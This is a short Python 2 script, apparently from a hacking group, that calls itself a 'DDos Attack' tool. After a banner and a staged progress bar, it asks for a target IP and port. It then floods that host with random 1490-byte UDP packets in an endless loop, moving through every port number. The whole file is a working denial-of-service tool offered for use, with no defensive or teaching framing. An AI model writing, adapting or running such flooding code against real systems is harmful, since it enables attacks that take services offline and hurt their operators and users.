import sys
import os
import time
import socket
import random

color_off="\033[0m"       # Text Reset
red="\033[0;31m"          # Red
blue="\033[0;34m"         # Blue
yellow="\033[0;33m"       # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
bgreen="\033[1;32m"       # Green0
on_purple="\033[45m"      # Purple
icyan="\033[0;96m"        # Cyan
bred="\033[1;31m"         # Red
on_igreen="\033[0;102m"   # Green
igreen="\033[0;92m"       # Green
upurple="\033[4;35m"      # Purple
biehite="\033[1;97m"      # White
byellow="\033[1;33m"      # Yellow
bcyan="\033[1;36m"        # Cyan
iblue="\033[0;94m"        # Blue
ured="\033[4;31m"         # Red
ired="\033[0;91m"         # Red

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

print(upurple+'''\n============================================================================================'''+color_off)

print(bgreen+      							   '''\nCEO- 𝙱𝚊𝚗𝚐𝚕𝚊𝚍𝚎𝚜𝚑 𝙷𝚊𝚌𝚔𝚒𝚗𝚐 𝙷𝚎𝚕𝚙 𝙲𝚎𝚗𝚝𝚛𝚎    '''                                   +color_off)
print(bred+'''                 	CEO- Dɑrk 420 Spɑmming Teɑm     '''                              +color_off)
print(bgreen+'''                       	 Devoloped By: 𝙍𝙞𝙝𝙖𝙣 𝘼𝙝𝙢𝙚𝙙            '''                            +color_off)



ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1